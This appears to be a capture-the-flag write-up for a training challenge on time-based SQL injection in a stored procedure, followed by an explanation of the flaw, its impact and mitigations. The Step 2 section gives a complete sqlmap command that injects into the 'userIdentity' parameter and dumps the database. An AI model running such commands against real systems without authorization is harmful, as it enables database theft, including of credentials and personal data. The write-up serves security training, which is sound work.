# SQL Injection Stored Procedure

## Description
To complete this challenge, you must exploit the SQL injection flaw in the following form to find the result key. This challenge involves a time-based SQL injection in a stored procedure.

## Solution
This challenge features a time-based SQL injection vulnerability within a stored procedure, which can be difficult to exploit manually. The most efficient approach is to use an automated tool like SQLmap to extract the data.

## Steps to Reproduce

### Step 1
Identify the vulnerable parameter (`userIdentity`) in the stored procedure.

### Step 2
Use SQLmap to automate the exploitation process. Update the following command with your session cookie and hostname:

```bash
sqlmap 'https://<hostname>/challenges/7edcbc1418f11347167dabb69fcb54137960405da2f7a90a0684f86c4d45a2e7' \
  -X POST \
  -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:142.0) Gecko/20100101 Firefox/142.0' \
  -H 'Accept: */*' \
  -H 'Accept-Language: en-US,en;q=0.5' \
  -H 'Accept-Encoding: gzip, deflate, br, zstd' \
  -H 'Sec-GPC: 1' \
  -H 'Connection: keep-alive' \
  -H 'Cookie: JSESSIONID=<your-JSESSIONID>; token=<your-token>' \
  -H 'Sec-Fetch-Dest: empty' \
  -H 'Sec-Fetch-Mode: no-cors' \
  -H 'Sec-Fetch-Site: same-origin' \
  -H 'Content-Type: application/x-www-form-urlencoded' \
  -H 'X-Requested-With: XMLHttpRequest' \
  -H 'Priority: u=4' \
  -H 'Pragma: no-cache' \
  -H 'Cache-Control: no-cache' \
  --data-raw 'userIdentity=*' \
  --dbms=mysql \
  --dump
```

### Step 3
Run the SQLmap command to extract the data from the database.

![](/writeups/assets/images/injection/sql-store.jpg)

## Exploit
This vulnerability is a time-based SQL injection in a stored procedure. Time-based injections work by causing the database to delay its response when a specific condition is met, allowing attackers to infer information about the database structure and content.

The vulnerability occurs because:
1. The stored procedure directly incorporates user input without proper sanitization
2. The application's response time varies based on the database query execution
3. Attackers can use this timing difference to extract information character by character

Using SQLmap automates this process by:
1. Sending payloads that cause time delays based on query results
2. Measuring response times to determine true/false conditions
3. Gradually building up information about the database content

## Impact
This vulnerability allows attackers to extract sensitive data from the database without direct feedback from the application. Time-based injections can be used to:
1. Enumerate database schema and table structures
2. Extract sensitive data such as user credentials or personal information
3. Potentially escalate privileges within the database

## Mitigation
1. Use parameterized queries or prepared statements even within stored procedures
2. Implement proper input validation and sanitization for all user-supplied data
3. Apply the principle of least privilege for database accounts used by applications
4. Monitor and log database query execution times to detect potential injection attempts
5. Regularly review and test stored procedures for injection vulnerabilities
6. Consider implementing query timeouts to limit the impact of time-based attacks

---

[← Previous](./sql-injection-escaping.md)